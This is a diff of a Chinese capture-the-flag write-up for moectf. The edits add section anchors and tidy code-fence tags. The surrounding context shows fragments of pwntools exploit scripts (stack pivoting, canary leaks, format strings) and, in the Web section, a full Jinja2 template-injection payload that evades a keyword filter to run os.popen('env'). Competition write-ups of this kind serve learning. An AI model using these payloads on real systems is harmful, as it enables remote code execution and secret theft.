@@ -17,10 +17,11 @@ lang: ''
 
 [Crypto](#Crypto)
 
-[PWN](#PWN)
+[PWN (AK)](#PWN)
 
 [Web](#Web)
 
+<a id="Misc"></a>
 ## Misc
 ### Misc入门指北
 进pdf搜`moectf{`即可
@@ -176,6 +177,8 @@ dHJ5OgogICAgMS8wCmV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgIG1hdGNoIGU6CiAgICAgICAgY2Fz
 ### 2048_master_re
 跟进`byte_47F0C0`拿到密文，xor `0x2a`
 `moectf{Y0u_4re_a_2048_m4st3r!!!!r0erowhu}``
+
+<a id="Reverse"></a>
 ## Reverse
 ### 逆向工程入门指北
 直接搜字符串就行
@@ -648,11 +651,12 @@ if __name__ == "__main__":
 解出来套个md5
 `moectf{a8c79927d4e830c3fe52e79f410216a0}`
 
+<a id="PWN"></a>
 ## PWN
 
 ### 0 二进制漏洞审计入门指北
 
-```Python
+```python
 from pwn import *                                    # 导入 pwntools。
 context(arch='amd64', os='linux', log_level='debug') # 一些基本的配置。
 
@@ -674,7 +678,7 @@ io.interactive()                    # 手动接收 flag。
 
 ### **1 ez_u64**
 
-```Python
+```python
 from pwn import *
 
 sh = remote('127.0.0.1',55745)
@@ -711,7 +715,7 @@ sh.interactive()
 
 ### 2 ezshellcode
 
-```Python
+```python
 from pwn import *
 context(arch='amd64', os='linux',log_level='debug')
 
@@ -724,7 +728,7 @@ sh.interactive()
 
 ### 3 认识libc
 
-```Python
+```python
 from pwn import *
 context(arch='amd64', os='linux',log_level='debug')
 
@@ -744,7 +748,7 @@ sh.interactive()
 
 ### boom
 
-```Python
+```python
 #!/usr/bin/env python3
 import contextvars
 
@@ -790,7 +794,7 @@ exploit()
 
 ### boom_revenge
 
-```Python
+```python
 #!/usr/bin/env python3
 import contextvars
 
@@ -838,7 +842,7 @@ exploit()
 
 def forge_linkmap是个板子，本人比较护食，不放出来了
 
-```Python
+```python
 from pwn import *
 
 context.arch = "amd64"
@@ -893,7 +897,7 @@ if __name__ == "__main__":
 
 注意leak1发送时得去掉末尾的\x00，要不然会拼接到leak2发送的低1byte
 
-```Python
+```python
 from pwn import *
 
 #sh = process('./pwn')
@@ -947,7 +951,7 @@ sh.interactive()
 
 ### str_check
 
-```Python
+```python
 from pwn import *
 
 #sh = process('./pwn')
@@ -966,7 +970,7 @@ sh.interactive()
 
 ### syslock
 
-```Python
+```python
 from pwn import *
 context.terminal = ["tmux", "splitw", "-h"]
 #sh = process('./pwn')
@@ -990,7 +994,7 @@ sh.interactive()
 
 ### xdulaker
 
-```Python
+```python
 from pwn import *
 
 #sh = process('./pwn')
@@ -1031,7 +1035,7 @@ sh.interactive()
 ### easylibc
 
 
-```Python
+```python
 from pwn import *
 
 sh = remote('127.0.0.1',57401)
@@ -1061,7 +1065,7 @@ sh.interactive()
 
 这题由于system仅仅是引入了符号，并非初始化，所以在第一次初始化时会进行大量的抬栈操作，所以栈迁移时得往很高的地址去迁移
 
-```Python
+```python
 from pwn import *
 context.terminal = ["tmux", "splitw", "-h"]
 #sh = process('./pwn')
@@ -1089,7 +1093,7 @@ sh.interactive()
 
 cananry绕过第一次输入覆盖掉他的\x00，第二次put带出canry，pie由于分页机制，低12bit不变，爆破就完了，backdoor绕过，为什么我要填backdoor地址，我直接填最后一部分的open flag地址就行了
 
-```Python
+```python
 from pwn import *
 context.terminal = ["tmux", "splitw", "-h"]
 
@@ -1114,7 +1118,7 @@ sh.interactive()
 
 这题就是多次栈迁移，很典的一道
 
-```Python
+```python
 from pwn import *
 
 context.terminal=['tmux','splitw','-h']
@@ -1155,7 +1159,7 @@ sh.interactive()
 
 open被禁用可以用openant代替
 
-```Python
+```python
 from pwn import *
 context(os='linux', arch='amd64',log_level='debug')
 context.terminal=['tmux','splitw','-h']
@@ -1187,7 +1191,7 @@ sh.interactive()
 
 ### inject
 
-```Python
+```python
 from pwn import *
 
 #sh = process('./pwn')
@@ -1203,7 +1207,7 @@ sh.interactive()
 
 ### call_it
 
-```Python
+```python
 from pwn import *
 
 elf = ELF('./pwn')
@@ -1237,7 +1241,7 @@ sh.interactive()
 ### fmt_s
 
 
-```Python
+```python
 from pwn import *
 #io=process('./pwn')
 io = remote('127.0.0.1', 60326)
@@ -1308,7 +1312,7 @@ io.interactive()
 
 ### fmt_t
 
-```Python
+```python
 from pwn import *
 #io=process('./pwn')
 io = remote('127.0.0.1', 62040)
@@ -1335,7 +1339,7 @@ io.send(payload)
 
 io.interactive()
 ```
-
+<a id="Crypto"></a>
 ## Crypto
 ### ezAES
 
@@ -2112,6 +2116,7 @@ for suffix in itertools.product(chars, repeat=3):
         except UnicodeDecodeError:
             continue
 ```
+<a id="Web"></a>
 ## Web
 ### 0 Web入门指北
 
@@ -2447,7 +2452,7 @@ fetch('/get_challenge?count=9')
 
 根据hint生成一个爆破字典
 
-```Python
+```python
 import itertools
 list = ['m', 'n', 'o', 'p', 'q']
 zd = [''.join(perm) for perm in itertools.permutations(list)]
@@ -2496,7 +2501,7 @@ ssti,过滤了["__", "global", "{{", "}}"]
 
 __和global用八进制绕过
 
-```Python
+```python
 {%set a='\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f'%}{%set b='\x5f\x5fgetitem\x5f\x5f'%}{%set c='os'%}{%set d='popen'%}{%set e='env'%}{%print lipsum|attr(a)|attr(b)(c)|attr(d)(e)|attr('read')()%}
 ```
 
